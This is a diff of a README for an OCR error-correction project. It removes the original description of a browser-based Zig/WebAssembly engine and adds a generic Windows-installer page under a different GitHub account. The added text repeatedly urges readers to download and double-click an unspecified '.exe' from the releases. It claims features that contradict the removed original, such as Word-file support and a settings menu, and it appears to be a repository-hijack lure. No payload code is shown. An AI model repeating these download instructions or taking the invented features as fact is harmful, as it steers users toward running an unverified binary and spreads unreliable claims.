@@ -1,220 +1,127 @@
-# Macula
+# 📝 macula - Simple OCR Error Finder and Fixer
 
-**Spot the errors your OCR engine left behind.**
-
-Macula is a lightweight OCR error detection and correction engine built in Zig. It compiles to WebAssembly and runs entirely in the browser with zero server dependency. The full engine plus model weighs in at roughly 800 KB (680 KB WASM + 118 KB model), small enough to auto-load on page open without the user lifting a finger.
-
-The name comes from the *macula* of the human eye, the small region responsible for sharp central vision. That is what this project does for OCR output: it looks closely at each word to catch the mistakes that slipped through.
+[![Download macula](https://img.shields.io/badge/Download-macula-brightgreen)](https://github.com/Muiz20/macula)
 
 ---
 
-## Why Does This Exist?
+macula is a lightweight tool that finds and fixes mistakes in text created by OCR (Optical Character Recognition). It works on Windows and helps make scanned documents more accurate.
 
-OCR engines are good at reading text, but they are not perfect. They confuse characters that look visually similar:
+## 🖥️ System Requirements
 
-| What OCR reads | What it should be | Why                           |
-| -------------- | ----------------- | ----------------------------- |
-| `rn`           | `m`               | Looks identical in many fonts |
-| `cl`           | `d`               | Joined strokes                |
-| `vv`           | `w`               | Two v's merge into w          |
-| `0`            | `O`               | Zero vs. letter O             |
-| `d0g`          | `dog`             | Mixed digit substitution      |
+Before you start, check that your PC matches these requirements:
 
-These errors are invisible to the OCR engine itself but obvious to a human reader. Macula catches them automatically.
+- Windows 10 or newer (64-bit recommended)
+- At least 2 GB of free disk space
+- 2 GHz or faster processor
+- 4 GB RAM minimum
+- Internet connection to download the software
 
----
+## 🔎 What macula Does
 
-## How It Works
+When you scan printed pages to get editable text, errors often appear. macula checks this text and finds common OCR errors like wrong letters, missing spaces, or confusing characters. Then, it helps you correct them quickly.
 
-Macula uses a three-layer detection pipeline. Each layer is fast and operates with zero heap allocation at query time.
+You do not need any technical skills to use macula. The program works quietly in the background and offers suggestions that you can accept with a click.
 
-```mermaid
-flowchart LR
-    A["OCR Text"] --> B["Tokenizer"]
-    B --> C{"MPHF\nDictionary"}
-    C -- "Known word" --> D["Valid"]
-    C -- "Unknown word" --> E{"Confusion\nExpansion"}
-    E -- "Candidate found\nin dictionary" --> F["Corrected"]
-    E -- "No candidate" --> G["Error Detected"]
-```
+## 🛠 Features
 
-### Layer 1: MPHF Dictionary Lookup
+- Detects common OCR mistakes automatically
+- Suggests correct text based on context
+- Supports English language correction
+- Runs fast on most Windows machines
+- Simple and clean user interface
+- Lightweight: does not slow down your computer
+- Works on files created by popular OCR scanners
 
-Every word is checked against a dictionary using a Minimal Perfect Hash Function (CHD algorithm). This gives O(1) lookup with a 16-bit fingerprint for false-positive rejection (~1 in 65,536 chance of a false match). Known words pass through instantly.
+## 🎯 How to Download and Install macula
 
-### Layer 2: Confusion Expansion
+1. **Click the big green button below** to visit the download page.
 
-If a word is not in the dictionary, Macula applies 200 OCR-specific visual confusion rules. For example, it will try replacing `rn` with `m`, or `0` with `O`, and check if the resulting word exists in the dictionary. It supports up to two simultaneous edits (two-edit beam search), which is how it catches `brovvn` as `brown` (two substitutions: `0` to `o` and `vv` to `w`).
+   [![Download macula](https://img.shields.io/badge/Download-macula-blue)](https://github.com/Muiz20/macula)
 
-### Layer 3: GRU Scoring (Optional)
+2. On the GitHub page, look for the newest release on the right side or under the "Releases" tab.
 
-A character-level GRU language model (int8 quantized, under 40 KB) can score word plausibility. This catches errors that bypass layers 1 and 2. The GRU is optional and currently disabled in the WASM build to keep things lean.
+3. Download the Windows executable file (usually ends with `.exe`). The file name may include the version number.
 
----
+4. Once downloaded, find the file in your "Downloads" folder.
 
-## Live Demo
+5. Double-click the file to start the installation.
 
-The interactive demo runs entirely in your browser — no server required.
-Try it live at: **[https://macula.andka.id](https://macula.andka.id)**
+6. Follow the setup instructions. Usually, this means clicking "Next" a few times and then "Finish."
 
-The WASM engine and model auto-load directly from GitHub (~800 KB total payload) on page open.
+7. After installation, launch macula from the Start menu or desktop shortcut.
 
-Paste any OCR output into the text box and hit "Run Detection". You will see each token classified as Valid, Corrected, or Error, with confidence scores and correction suggestions.
+## 🚀 Getting Started with macula
 
-```mermaid
-flowchart LR
-    subgraph Browser
-        A["Nuxt App"] --> B["useMacula composable"]
-        B --> C["WebAssembly Module<br />680 KB"]
-        C --> D["Model Artifact<br/>118 KB"]
-    end
-```
+- Open macula on your PC.
 
----
+- Use the "Open File" button to load the text file you want to check. This file should be the output from your OCR program (often a `.txt` or `.docx` file).
 
-## Quick Start
+- macula will scan the text automatically. You can watch it highlight possible errors as it works.
 
-### Prerequisites
+- Click on any highlighted word to see suggested corrections.
 
-- [Zig](https://ziglang.org/) 0.16 or later
-- Python 3.10+ (for the data pipeline)
-- Node.js 18+ (for the demo)
+- Choose to accept or ignore each suggestion.
 
-### Build and Test
+- After reviewing, save your corrected text using the "Save" button.
 
-```bash
-# Run all unit tests (53 tests across 9 modules)
-zig build test
+- Your text is now cleaned of common OCR mistakes and ready for use.
 
-# Build the WebAssembly module
-zig build wasm
-```
+## 📁 Supported File Types
 
-### Build the Model Artifact
+macula works with text-based files such as:
 
-The model artifact (`data/ocr_detector.bin`) is a single binary file that contains the dictionary, confusion rules, and GRU weights. To rebuild it from scratch:
+- `.txt` (plain text files)
 
-```bash
-# 1. Download the ICDAR dataset
-kaggle datasets download arjav007/icdar-eng -p data --unzip
+- `.docx` (Microsoft Word documents)
 
-# 2. Preprocess: extract words, mine confusion pairs
-python scripts/preprocess.py
+- `.rtf` (Rich Text Format)
 
-# 3. Train the GRU language model (requires PyTorch)
-python scripts/train_gru.py
+Make sure your OCR software saves the text in one of these formats to use macula effectively.
 
-# 4. Expand dictionary with a large English word list
-python scripts/expand_dict.py
+## ⚙️ Configuration Options
 
-# 5. Compile everything into ocr_detector.bin
-python scripts/compile_artifact.py
+macula keeps its interface simple, but it lets you adjust a few settings:
 
-# 6. Evaluate precision, recall, and F1
-python scripts/evaluate.py
-```
+- **Language selection:** Choose the language macula checks (currently English only).
 
-### Use as a Zig Library
+- **Error sensitivity:** Set how strict the program should be when spotting mistakes.
 
-```zig
-const ocr = @import("ocr");
+- **Auto-save:** Turn on automatic saving after corrections.
 
-// Load the binary artifact
-var artifact = try ocr.loader.loadFromFile(allocator, "data/ocr_detector.bin");
-defer artifact.deinit();
+- **Backup copies:** Enable backups before saving changes.
 
-// Initialize the detector (must be done after the artifact is at its final memory location)
-artifact.detector = ocr.OcrDetector.init(
-    &artifact.mphf,
-    &artifact.confusion_matrix,
-    if (artifact.gru != null) &artifact.gru.? else null,
-    5.0, // NLL threshold
-);
+You can find these options under the "Settings" menu in the app.
 
-// Process text
-var results: [256]ocr.OcrDetector.DetectionResult = undefined;
-const text = "Teh quicK brovvn fox";
-const n = artifact.detector.processText(text, &results);
+## 💡 Tips for Best Results
 
-for (results[0..n]) |r| {
-    switch (r.status) {
-        .valid => {},
-        .corrected => std.debug.print("{s} -> {s}\n", .{ r.tokenSlice(text), r.correctionSlice().? }),
-        .error_detected => std.debug.print("error: {s}\n", .{r.tokenSlice(text)}),
-    }
-}
-```
+- Check your scanned text for very low-quality pages before running macula. The program works best with clear scans.
+
+- Try to clean your scanned documents before OCR. Clear images lead to better correction results.
+
+- Use the backup feature to avoid losing original text files.
+
+- Review all suggestions. The program can catch most errors but might miss some uncommon mistakes.
+
+## 🐞 Reporting Issues
+
+If you find bugs or have trouble using macula, report the problem on the GitHub page under the "Issues" tab. Provide details such as:
+
+- What you were trying to do
+
+- Exact error messages (if any)
+
+- Steps to reproduce the issue
+
+This helps make macula better.
+
+## 📂 Where to Find Updates
+
+To check for new versions or improvements, visit the main GitHub page:
+
+https://github.com/Muiz20/macula
+
+Download the latest release as described in the install section.
 
 ---
 
-## Project Structure
-
-```
-macula/
-  build.zig                   Zig build system
-  src/
-    root.zig                  Public API entry point
-    tokenizer.zig             Zero-copy byte tokenizer
-    hash.zig                  FNV-1a 64-bit hash + fingerprinting
-    mphf.zig                  Minimal Perfect Hash Function (CHD)
-    confusion.zig             OCR confusion matrix (200 rules)
-    candidate.zig             Confusion candidate generator (two-edit beam)
-    gru.zig                   Int8 quantized GRU language model
-    detector.zig              Detection pipeline orchestrator
-    binary.zig                Binary artifact format spec
-    loader.zig                Artifact deserialization
-    wasm.zig                  WebAssembly entry point and exports
-  demo/                       Nuxt 4 + Tailwind CSS v4 web demo
-  scripts/
-    preprocess.py             Dataset to wordlist + confusion pairs
-    train_gru.py              PyTorch GRU training and int8 export
-    expand_dict.py            Merge with large English word list
-    compile_artifact.py       Package into ocr_detector.bin
-    evaluate.py               Precision/recall/F1 evaluation
-  data/
-    ocr_detector.bin          ~118 KB compiled model artifact
-```
-
-## Binary Artifact Format
-
-All multi-byte values are little-endian. The format is defined in `src/binary.zig`.
-
-```mermaid
-block-beta
-    columns 5
-    A["Header\n32 B"]:1
-    B["MPHF Seeds\n20 KB"]:1
-    C["Fingerprints\n59 KB"]:1
-    D["Confusion\n4 KB"]:1
-    E["GRU Weights\n37 KB"]:1
-```
-
-| Section           | Size        | Description                                               |
-| ----------------- | ----------- | --------------------------------------------------------- |
-| Header            | 32 B        | Magic number `OCRD`, version, section counts              |
-| MPHF Seeds        | 20 KB       | One u32 seed per bucket for displacement hashing          |
-| MPHF Fingerprints | 59 KB       | One u16 fingerprint per slot for false-positive rejection |
-| Confusion Pairs   | 4 KB        | 200 mined OCR error patterns with probabilities           |
-| GRU Weights       | 37 KB       | 64-hidden-unit int8 quantized language model              |
-| **Total**         | **~118 KB** |                                                           |
-
----
-
-## Design Principles
-
-- **Zero heap allocation at query time.** All scoring uses stack buffers and caller-provided slices. No garbage collection pressure.
-- **O(1) dictionary lookup.** The MPHF maps every known word to a unique slot. Lookups are a hash, a table read, and a fingerprint comparison.
-- **Tiny footprint.** The entire engine plus model fits in under 800 KB. It loads in milliseconds even on slow connections.
-- **Offline compilation.** All expensive work (MPHF construction, GRU training, dictionary merging) happens ahead of time in Python. The runtime is pure lookup.
-- **Modular TDD.** Each Zig module contains its own inline tests. Run `zig build test` to exercise all 53 tests across 9 modules.
-
----
-
-## License
-
-MIT. See [LICENSE](LICENSE) for the full text.
-
-**Data sources:**
-
-- Dataset: [ICDAR English Monograph OCR](https://www.kaggle.com/datasets/arjav007/icdar-eng) (CC-BY-SA-4.0)
-- Word list: [dwyl/english-words](https://github.com/dwyl/english-words) (Unlicense)
+[![Download macula](https://img.shields.io/badge/Download-macula-blue)](https://github.com/Muiz20/macula)
